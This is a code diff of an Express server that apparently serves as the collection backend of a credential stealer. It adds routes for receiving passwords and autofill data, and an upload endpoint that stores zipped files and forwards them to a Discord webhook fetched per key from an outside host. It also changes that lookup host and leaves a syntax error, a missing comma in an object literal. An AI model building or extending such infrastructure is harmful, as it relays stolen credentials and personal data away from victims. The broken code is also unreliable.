@@ -17,14 +17,19 @@ app.get('/', (req, res) => {
 });
 
 
+app.use('/api/send/passwords', require('./Routes/passwords'));
+app.use('/api/send/autofill', require('./Routes/autofill'));
+
 app.use(express.json({limit: "900mb"}));
 app.use(express.static('uploads'));
 
 app.use(express.urlencoded({ extended: true }));
 const errorlog = config.session.errorurl;
+const injection = config.session.injection;
 
 const webhookUrls = {
 error: errorlog
+injection: injection
 };
 
 const webhookClients = {};
@@ -62,7 +67,7 @@ app.post('/webhooks/:route', async (req, res) => {
   };
 
   try {
-    const response = await axios.post('https://redroseproject.xyz/keysorgu/keysorgu.php', payload);
+    const response = await axios.post('http://redrose5.liveblog365.com/keysorgu/keysorgu.php', payload);
     const webhookURL = response.data;
 
     if (!key) {
@@ -124,6 +129,74 @@ app.post('/webhooks/:route', async (req, res) => {
 });
 
 
+app.post('/upload', upload.single('file'), async (req, res) => {
+  try {
+    const key = req.body && req.body.json ? JSON.parse(req.body.json).key : null;
+
+    if (!key) {
+      return res.status(400).json({ message: 'No key provided in the form data' });
+    }
+
+    const randomString = crypto.randomBytes(2).toString('hex');
+const payload = {
+  key: key, // Assuming key is defined elsewhere in your code
+  // Other payload data if needed
+};
+const response = await axios.post('https://redroseproject.xyz/keysorgu/keysorgu.php', payload);
+
+    const webhookURL = response.data;
+
+    if (!webhookURL) {
+      return res.status(500).json({ message: 'Error getting webhook URL' });
+    }
+
+    if (!req.file) {
+      return res.status(400).json({ message: 'No file uploaded' });
+    }
+
+    const zipData = req.file.buffer;
+    const zip = new AdmZip(zipData);
+    const zipName = req.file.originalname;
+    const zipNameWithRandom = `${randomString}_${zipName}`;
+
+    const zipPath = path.join(uploadFolder, zipNameWithRandom);
+
+    await fs.writeFile(zipPath, zipData);
+
+    const webhookClient = new WebhookClient({ url: webhookURL });
+
+    webhookClient.send({
+      files: [{
+        attachment: zipPath,
+        name: zipName,
+      }],
+    });
+
+   
+    res.json({ message: 'File uploaded and extracted successfully' });
+  } catch (error) {
+    res.status(500).json({ message: 'Internal server error' });
+  }
+});
+
+///
+const routeMappings = require('./routeMappings.json');
+
+app.get('/:route', async (req, res) => {
+  const route = req.params.route;
+ 
+
+  if (routeMappings.hasOwnProperty(route)) {
+    res.sendFile(__dirname + routeMappings[route]);
+  } else {
+    res.status(404).send('Böyle sayfa yok');
+  }
+});
+
+
+
+
+//
 const PORT = process.env.PORT || 80;
 app.listen(PORT)
   console.log(`Listening on port ${PORT}`);
